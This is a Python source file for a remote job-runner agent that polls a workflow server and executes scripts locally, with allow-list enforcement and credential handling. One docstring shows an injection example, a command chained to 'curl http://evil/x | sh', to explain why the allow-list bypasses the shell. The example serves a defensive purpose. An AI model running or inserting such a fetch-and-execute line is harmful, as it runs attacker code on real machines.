#!/usr/bin/env python3
# SPDX-FileCopyrightText: 2026 Joachim Klahr
# SPDX-License-Identifier: AGPL-3.0-or-later
"""The Dazyflow runner agent: ask a Dazyflow server for work, run it here.

    python3 dzrunner.py --url https://dazyflow.example.com --token dzrt_... --name my-box

That registers once, saves a credential, and starts working. Run it again with
no token and it picks up the saved credential.

This is one file, standard library only, on purpose.

You are about to let a Dazyflow flow run commands on this machine. You should
be able to read the thing that does that before you trust it — which rules out
a compiled binary, however convenient. There is no build step, no runtime to
install, and no dependency to vet: if you have python3, you have the agent.

It never listens on a port. The connection goes outward, which is what lets a
machine behind NAT be a runner at all, and means installing this opens nothing.
"""

import argparse
import json
import os
import platform
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

VERSION = "0.2.0"

# How long to wait after an empty poll.
#
# Five seconds, against the server's 90-second "online" window: a runner has to
# miss eighteen polls before it reads as gone, so an ordinary network hiccup
# never makes a machine flicker in the admin list.
POLL_SECONDS = 5

# How often a running command reports in to hold its claim. Well inside the
# server's lease, so a slow network does not lose the task.
HEARTBEAT_SECONDS = 30

DEFAULT_TIMEOUT_SECONDS = 600

# The most output this agent will send back, per stream.
#
# The server caps a result body at 4 MiB and rejects anything larger. Trimming
# here rather than finding that out afterwards is the difference between a step
# that says "the script printed too much" and a step that says "the runner
# stopped responding" about a machine that is online and finished in two
# seconds. A script that produces more than this should write to a file.
MAX_OUTPUT_BYTES = 1 << 20

# How many times to retry reporting a result before giving up on it. The task
# is already done at this point, so a dropped packet here fails a step for no
# reason; the server tells us which failures are worth retrying.
REPORT_ATTEMPTS = 4

# ---------------------------------------------------------------------------
# HTTP: urllib, so there is nothing to install
# ---------------------------------------------------------------------------


class HTTPError(Exception):
    """A request failed. Carries the status so callers can branch on 401."""

    def __init__(self, status, body):
        super().__init__(f"{status}: {body[:400]}")
        self.status = status
        self.body = body


def post(url, payload, credential=None, timeout=60):
    """POST JSON and return (status, decoded-body-or-None).

    A 204 has no body and is the answer to most polls, so it is a normal
    return rather than an exception.
    """
    data = json.dumps(payload if payload is not None else {}).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    if credential:
        req.add_header("Authorization", "Bearer " + credential)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as res:
            raw = res.read()
            if res.status == 204 or not raw:
                return res.status, None
            return res.status, json.loads(raw)
    except urllib.error.HTTPError as e:
        raise HTTPError(e.code, e.read().decode("utf-8", "replace")) from e
    except OSError as e:
        # Every transport failure has to arrive as HTTPError, because that is
        # what the callers catch. urllib.error.URLError is only part of the
        # set: a timeout while READING the response raises TimeoutError, which
        # is not a URLError but is an OSError, and catching only the former
        # let a single slow response kill the agent mid-task.
        reason = getattr(e, "reason", e)
        raise HTTPError(0, f"could not reach {url}: {reason}") from e
    except ValueError as e:
        # A 200 carrying an HTML error page from a proxy. json.loads raises
        # JSONDecodeError, a ValueError — also not a URLError.
        raise HTTPError(0, f"{url} did not return JSON: {e}") from e


# ---------------------------------------------------------------------------
# Configuration: one file, holding one secret
# ---------------------------------------------------------------------------


def default_config_path():
    base = os.environ.get("XDG_CONFIG_HOME")
    if base:
        return Path(base) / "dazyflow" / "runner.json"
    return Path.home() / ".config" / "dazyflow" / "runner.json"


def load_config(path):
    try:
        return json.loads(Path(path).read_text())
    except (OSError, ValueError):
        return None


def save_config(path, cfg):
    """Write the credential 0600, with no window in which it is not.

    It is a long-lived secret and this often runs on a machine with other
    users on it, so the mode is set explicitly rather than left to umask.

    Created through os.open with the mode, not written and then chmod'ed:
    write_text creates the file with 0666 & ~umask — 0644 under the common
    default — and narrowing it on the next statement leaves a window in which
    anyone on the machine can read it. The credential never rotates, so
    whoever wins that race keeps it until an admin deletes the runner.
    """
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    body = json.dumps(cfg, indent=2) + "\n"
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        f.write(body)
    # An existing file keeps its old mode through O_CREAT, so narrow it too.
    os.chmod(path, 0o600)


def sanitize_name(s):
    """Map a hostname onto what the server accepts.

    Names are lower-case letters, digits, dash and underscore. A hostname with
    a dot or a capital in it is normal, and should not fail registration.
    """
    out = "".join(c if c.isalnum() or c in "-_" else "-" for c in s.lower())
    out = out.strip("-") or "runner"
    return out[:64]


def default_name():
    try:
        return sanitize_name(socket.gethostname())
    except OSError:
        return "runner"


def default_labels():
    """Describe the machine, so a flow can target "any linux box" without
    anyone having to label it by hand."""
    return f"{sys.platform},{platform.machine()}".lower()


# ---------------------------------------------------------------------------
# Registration
# ---------------------------------------------------------------------------


def register(url, token, name, labels):
    base = url.rstrip("/")
    try:
        status, body = post(
            base + "/api/v1/runner/register",
            {"token": token, "name": name, "labels": labels, "version": VERSION},
        )
    except HTTPError as e:
        if e.status == 401:
            raise SystemExit(
                "That registration token is not valid.\n"
                "Tokens expire after 30 minutes and can only be used once — "
                "get a fresh one from Admin → Runners."
            ) from e
        raise SystemExit(f"Could not register: {e}") from e
    if not body or "credential" not in body:
        raise SystemExit("The server did not return a credential.")
    return {"url": base, "name": body.get("name", name), "credential": body["credential"]}


def load_or_register(path, url, token, name, labels):
    cfg = load_config(path)
    if cfg and cfg.get("credential"):
        if token:
            # Registering again would mint a second identity for one machine
            # and silently orphan the first. Say so rather than doing it.
            log(
                f'already registered as "{cfg["name"]}"; ignoring --token '
                f"(delete {path} to register again)"
            )
        if url and url.rstrip("/") != cfg.get("url"):
            cfg["url"] = url.rstrip("/")
        return cfg
    if not url or not token:
        raise SystemExit(
            "First run needs --url and --token.\n"
            "Get a token from Admin → Runners in Dazyflow."
        )
    cfg = register(url, token, name, labels)
    save_config(path, cfg)
    return cfg


# ---------------------------------------------------------------------------
# Running work
# ---------------------------------------------------------------------------


def log(msg):
    print(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}", flush=True)


# The interpreters a step may ask for, and the extension the script is written
# with. The server offers exactly these words; anything else it sends — an older
# agent's idea of the list, a newer server's — falls back to the machine's own
# shell, which is what a runner did before this was a choice.
#
# The extension is not cosmetic. PowerShell will not run a file that is not
# .ps1, and Python's traceback names the file, so a syntax error in a flow's
# script reads as "line 4 of dz-abc123.py" instead of "<string>".
SHELL_SUFFIXES = {
    "sh": ".sh",
    "bash": ".sh",
    "python": ".py",
    "powershell": ".ps1",
    "node": ".js",
}


def interpreter_argv(shell):
    """Return the argv that starts `shell` here, minus the script path.

    None means the program is not installed on this machine — a refusal the
    caller can name, rather than the bare OSError the exec would raise.

    Which program a word means is decided HERE, on the machine, because this is
    the only place that can know: the server has no idea whether "python" is
    /usr/bin/python3, a pyenv shim, or absent.
    """
    if shell in ("sh", "bash"):
        exe = shutil.which(shell)
        return [exe] if exe else None
    if shell == "python":
        # PATH first, so a script runs under the machine's Python rather than
        # whatever happens to be running the agent. sys.executable is the
        # fallback because an agent that is running proves one Python exists.
        exe = shutil.which("python3") or shutil.which("python") or sys.executable
        return [exe] if exe else None
    if shell == "node":
        exe = shutil.which("node") or shutil.which("nodejs")
        return [exe] if exe else None
    if shell == "powershell":
        # pwsh first: it is PowerShell 7, the one that exists on every platform.
        exe = shutil.which("pwsh") or shutil.which("powershell")
        if not exe:
            return None
        argv = [exe, "-NoProfile", "-NonInteractive"]
        if os.name == "nt":
            # A .ps1 in a temp directory is refused outright under a stock
            # Windows execution policy, so without this every PowerShell step
            # would fail on a freshly installed Windows runner. Windows only:
            # -ExecutionPolicy is not a parameter pwsh has elsewhere.
            argv += ["-ExecutionPolicy", "Bypass"]
        return argv + ["-File"]
    return None


def plan_interpreter(shell, allowed):
    """Decide how to start the step's chosen interpreter.

    Returns (argv-prefix, suffix, refusal). A refusal is the agent's decision
    and is reported as such, so the flow author learns the script never ran.

    The allow-list check is the interesting half. With an interpreter the
    program being started is the interpreter, NOT the first word of the script
    — so the ordinary check ("is the script's first word permitted?") would be
    answering the wrong question, and answering it favourably: a runner allowed
    to run ./fetch-invoices.sh would happily run any Python at all. So an
    allow-list must name the interpreter itself, and be understood for what it
    then is: permission to run arbitrary code in that language.
    """
    if allowed and shell not in allowed:
        return None, None, (
            f'this runner is not allowed to run scripts with "{shell}" '
            f"(permitted: {', '.join(allowed)}). "
            f'Add "{shell}" to the allow-list if a flow should be able to run '
            f"{shell} code here — which is permission to run anything that "
            "language can do — or leave the step on the machine's own shell "
            "and allow the individual script instead."
        )
    argv = interpreter_argv(shell)
    if argv is None:
        return None, None, (
            f'this runner was asked to run the script with "{shell}", '
            "which is not installed on this machine"
        )
    return argv, SHELL_SUFFIXES[shell], None


def plan(script, allowed):
    """Decide how to run a command with the machine's own shell.

    Returns (argv-or-string, use_shell, refusal). This is the path for a step
    that did not choose an interpreter — see plan_interpreter for the one that
    did.

    With NO allow-list the command goes to a shell, because that is what the
    step promises: whatever the flow sends, run it here.

    With an allow-list it does not, and that is the whole point. Checking the
    first word and then handing the string to a shell enforces nothing:
    `--allow ./fetch-invoices.sh` would permit

        ./fetch-invoices.sh ; curl http://evil/x | sh

    because the first word still matches. The docs promise "it will then
    refuse anything else", so an allow-list means the command is parsed here
    and executed directly — no shell, so `;`, `|`, `&&`, backticks and
    `$(...)` are ordinary characters in an argument rather than operators.

    What that still does not buy: it restricts what gets INVOKED, not what the
    invoked program may then do. Allowing a shell, or a program that shells
    out, allows everything. It is a guard against a flow running the wrong
    thing, not a sandbox.
    """
    if not allowed:
        return script, True, None
    try:
        argv = shlex.split(script)
    except ValueError as e:
        return None, False, f"this runner could not read that command: {e}"
    if not argv:
        return None, False, "this runner was sent an empty command"
    if argv[0] not in allowed:
        return None, False, (
            f'this runner is not allowed to run "{argv[0]}" '
            f"(permitted: {', '.join(allowed)}). "
            "Note that a runner with an allow-list runs commands directly, "
            "without a shell — put pipes, redirects and ';' inside a script "
            "and allow that script instead."
        )
    return argv, False, None


def trim(stream, limit=MAX_OUTPUT_BYTES):
    """Cap one output stream, returning (text, dropped-bytes).

    The tail is kept rather than the head: for a log the end is where the
    failure is, and for anything else the output is already unusable.
    """
    raw = (stream or "").encode("utf-8", "replace")
    if len(raw) <= limit:
        return stream or "", 0
    return raw[-limit:].decode("utf-8", "replace"), len(raw) - limit


class Agent:
    def __init__(self, cfg, allowed):
        self.cfg = cfg
        self.allowed = allowed
        self.stopping = False

    def url(self, path):
        return self.cfg["url"] + path

    def claim(self):
        """Ask for work. Returns a task dict, or None for nothing to do."""
        status, body = post(self.url("/api/v1/runner/claim"), {}, self.cfg["credential"])
        if status == 204:
            return None
        return body

    def execute(self, task):
        """Run one task and capture what it produced.

        Never raises: whatever goes wrong here becomes a reported error, so the
        step is told what happened instead of waiting out the lease on an agent
        that died.
        """
        try:
            return self._execute(task)
        except Exception as e:  # noqa: BLE001 — deliberately total
            return {"error": f"the runner agent could not finish this step: {e}"}

    def _execute(self, task):
        script = task.get("script", "")
        # An unknown word — an older agent's list, a newer server's — means the
        # machine's own shell, the behaviour a runner had before the step could
        # choose. Silently picking some other interpreter would be worse than
        # doing what the default has always done.
        shell = str(task.get("shell") or "").strip().lower()
        if shell not in SHELL_SUFFIXES:
            shell = ""

        script_file = None
        if shell:
            prefix, suffix, refusal = plan_interpreter(shell, self.allowed)
            if refusal:
                return {"error": refusal}
            script_file = self.write_script(script, suffix)
            command, use_shell = prefix + [script_file], False
        else:
            command, use_shell, refusal = plan(script, self.allowed)
            if refusal:
                # Refused locally, and reported as the agent's decision rather
                # than a script failure — the flow author needs to know it
                # never ran.
                return {"error": refusal}

        try:
            return self._run(task, command, use_shell)
        finally:
            if script_file:
                # Best effort: a script that will not delete is not a reason to
                # fail a step that has already run.
                try:
                    os.unlink(script_file)
                except OSError:
                    pass

    @staticmethod
    def write_script(script, suffix):
        """Write the script somewhere the interpreter can be pointed at.

        A file rather than `-c`/`-Command` with the script as an argument, for
        three reasons that all bite in practice: a long script exceeds the
        command-line limit on Windows, PowerShell's quoting of an inline script
        is its own field of study, and an interpreter given a real filename puts
        that filename in its error messages.
        """
        fd, path = tempfile.mkstemp(prefix="dzrunner-", suffix=suffix)
        with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as f:
            f.write(script)
        return path

    def _run(self, task, command, use_shell):
        timeout = int(task.get("timeout_seconds") or 0) or DEFAULT_TIMEOUT_SECONDS
        env = dict(os.environ)
        # Not scrubbed: unlike a plugin inside the daemon, this process is the
        # org's own machine and its environment is theirs to arrange.
        env.update(task.get("env") or {})

        stop_beat = self.heartbeat(task["id"])
        try:
            proc = subprocess.run(
                command,
                shell=use_shell,
                input=task.get("stdin") or "",
                capture_output=True,
                # errors="replace" so a command emitting bytes that are not
                # UTF-8 comes back mangled rather than raising out of the
                # agent and leaving the task unreported.
                text=True,
                errors="replace",
                timeout=timeout,
                env=env,
            )
        except subprocess.TimeoutExpired as e:
            return self._sized({
                "stdout": _text(e.stdout),
                "stderr": _text(e.stderr),
                "error": f"the command was still running after {timeout}s and was stopped",
            })
        except OSError as e:
            # Could not start at all — a missing interpreter, a permission
            # problem. Distinct from a command that ran and failed.
            return {"error": f"could not run the command: {e}"}
        finally:
            stop_beat()

        return self._sized({
            "exit_code": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        })

    @staticmethod
    def _sized(result):
        """Trim the streams to what the server accepts, and say so if trimmed.

        A trimmed stdout FAILS the step rather than being handed on quietly.
        The step's output feeds the rest of the flow, and half a JSON document
        that looks like a success is worse than an error naming the limit.
        """
        stdout, lost_out = trim(result.get("stdout", ""))
        stderr, lost_err = trim(result.get("stderr", ""))
        if lost_out or lost_err:
            result["stdout"] = stdout
            result["stderr"] = stderr
            if not result.get("error"):
                result["error"] = (
                    f"the command printed {lost_out + lost_err} bytes more than this "
                    f"runner can send back ({MAX_OUTPUT_BYTES} per stream); "
                    "only the end of the output is shown. Have the script write "
                    "large output to a file instead."
                )
        return result

    def heartbeat(self, task_id):
        """Hold the claim while the command works.

        Without this a command that says nothing for the length of the lease
        looks identical to an agent that died, and the server would give up on
        the task and fail the step — while this machine was still working on it.

        The server does not hand the work to anyone else: it cannot know how far
        an arbitrary script got, so a lapsed claim is failed rather than retried.
        That makes this heartbeat the only thing standing between a long, quiet
        command and a step that reports a failure which did not happen.
        """
        done = threading.Event()

        def beat():
            while not done.wait(HEARTBEAT_SECONDS):
                try:
                    post(
                        self.url(f"/api/v1/runner/tasks/{task_id}/progress"),
                        {},
                        self.cfg["credential"],
                    )
                except HTTPError:
                    # Losing a heartbeat is not worth stopping the command; the
                    # server decides whether the claim survives.
                    pass

        t = threading.Thread(target=beat, daemon=True)
        t.start()
        return done.set

    def report(self, task_id, result):
        """Send the result, retrying the failures that are worth retrying.

        The task is finished by the time this runs, so giving up on the first
        dropped packet fails a step for nothing: the server never hears the
        answer and eventually reports that this machine stopped responding.
        A 4xx is the server refusing the result on its merits — no amount of
        retrying changes that — so only transport failures and 5xx come back.
        """
        for attempt in range(REPORT_ATTEMPTS):
            try:
                post(
                    self.url(f"/api/v1/runner/tasks/{task_id}/result"),
                    result,
                    self.cfg["credential"],
                )
                return
            except HTTPError as e:
                retryable = e.status == 0 or e.status >= 500
                if not retryable or attempt == REPORT_ATTEMPTS - 1:
                    raise
                delay = 2**attempt
                log(f"task {task_id}: reporting failed ({e}); retrying in {delay}s")
                self._sleep(delay)

    def run(self, once=False):
        while not self.stopping:
            try:
                task = self.claim()
            except HTTPError as e:
                if e.status == 401:
                    # The runner was deleted, or its credential rotated.
                    # Nothing this process can do will fix it.
                    raise SystemExit(
                        "This runner is no longer registered.\n"
                        "Register it again with a new token from Admin → Runners."
                    ) from e
                log(f"claim: {e}")
                self._sleep(POLL_SECONDS)
                continue

            if task is None:
                if once:
                    # --once is "run one task and exit, for testing". Waiting
                    # forever on an empty queue is the one thing it must not do.
                    log("nothing to do")
                    return
                self._sleep(POLL_SECONDS)
                continue

            # The interpreter is part of what ran, so the machine's own log says
            # which one — otherwise a Python script and a shell script look
            # identical here and "why did that fail?" starts with a guess.
            with_shell = str(task.get("shell") or "").strip().lower()
            prefix = f"[{with_shell}] " if with_shell in SHELL_SUFFIXES else ""
            log(f"task {task['id']}: {prefix}{task.get('script', '')}")
            result = self.execute(task)
            try:
                self.report(task["id"], result)
            except HTTPError as e:
                log(f"task {task['id']}: could not report the result: {e}")
            if once:
                return

    def _sleep(self, seconds):
        # Sleep in slices so a signal is noticed promptly rather than after a
        # full poll interval.
        deadline = time.monotonic() + seconds
        while not self.stopping and time.monotonic() < deadline:
            time.sleep(0.2)


def _text(v):
    if v is None:
        return ""
    return v if isinstance(v, str) else v.decode("utf-8", "replace")


# ---------------------------------------------------------------------------


def build_parser():
    """The command line, in one place so a test can read it.

    Separate from main() because main() registers with a server and then polls
    forever: checking that a flag lands where it should had no way in short of
    running the whole agent.
    """
    p = argparse.ArgumentParser(
        prog="dzrunner",
        description="Run Dazyflow steps on this machine.",
    )
    p.add_argument("--url", default="", help="Dazyflow server URL, e.g. https://dazyflow.example.com")
    p.add_argument("--token", default="", help="registration token from Admin → Runners (first run only)")
    p.add_argument("--name", default=default_name(), help="name for this machine, as it appears in Dazyflow")
    # --tags is the name the web UI and the docs use; --labels is what the flag
    # was called first and what every existing install script passes, so both
    # write to the same place rather than one of them becoming a lie. Same dest,
    # so passing both is last-one-wins instead of a conflict nobody can see.
    p.add_argument("--tags", dest="labels", default=default_labels(),
                   help="comma-separated tags a flow can target this machine by (its name is always one)")
    p.add_argument("--labels", dest="labels", help=argparse.SUPPRESS)
    p.add_argument(
        "--allow",
        default="",
        help="only run these programs (comma-separated). Empty means any command the flow sends",
    )
    p.add_argument("--config", default=str(default_config_path()), help="where to keep the credential")
    p.add_argument("--once", action="store_true", help="run one task and exit, for testing")
    p.add_argument(
        "--register-only",
        action="store_true",
        help="register this machine and exit, without claiming any work",
    )
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)

    labels = [x.strip() for x in args.labels.split(",") if x.strip()]
    allowed = [x.strip() for x in args.allow.split(",") if x.strip()]

    cfg = load_or_register(args.config, args.url, args.token, args.name, labels)
    log(f'registered as "{cfg["name"]}" against {cfg["url"]}')

    if args.register_only:
        # The installer uses this to spend the token while it still has the
        # operator's attention, so an expired or reused one is reported to their
        # terminal instead of disappearing into a service log. The credential is
        # saved, so whatever starts the agent next needs no token.
        return 0

    if allowed:
        log("only these programs may run: " + ", ".join(allowed))
    else:
        # Said out loud on every start. An operator who did not mean to allow
        # anything should learn it from the log, not from an incident.
        log(
            "WARNING: any command a flow sends will run on this machine. "
            "Use --allow to restrict it."
        )

    agent = Agent(cfg, allowed)

    def stop(_signum, _frame):
        # Stop between tasks, so restarting the service does not kill a command
        # halfway through.
        log("stopping after the current task")
        agent.stopping = True

    signal.signal(signal.SIGINT, stop)
    signal.signal(signal.SIGTERM, stop)
    agent.run(once=args.once)
    return 0


if __name__ == "__main__":
    sys.exit(main())
